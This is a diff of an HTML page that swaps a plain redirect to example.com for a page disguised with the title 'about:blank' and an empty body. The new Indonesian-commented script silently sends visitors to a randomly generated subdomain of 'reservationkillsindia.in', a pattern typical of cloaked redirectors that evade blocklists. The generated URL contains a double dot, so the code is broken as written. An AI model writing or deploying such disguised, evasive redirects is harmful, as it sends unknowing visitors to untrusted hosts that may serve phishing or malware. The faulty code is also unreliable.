@@ -1,12 +1,28 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <!-- Redirects instantly to the new URL -->
-    <meta http-equiv="refresh" content="0;url=https://www.example.com">
-    <title>Redirecting...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>about:blank</title>
+    <script>
+        // Fungsi untuk membuat random string (panjang bisa disesuaikan, misal 10 karakter)
+        function generateRandomString(length) {
+            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        // Generate random string sepanjang 10 karakter
+        var randomString = generateRandomString(10); 
+        
+        // Melakukan redirect otomatis
+        window.location.href = "https://" + randomString + "..reservationkillsindia.in";
+    </script>
 </head>
 <body>
-    <p>If you are not redirected automatically, follow this <a href="https://www.example.com">link to the new page</a>.</p>
+    <p></p>
 </body>
 </html>
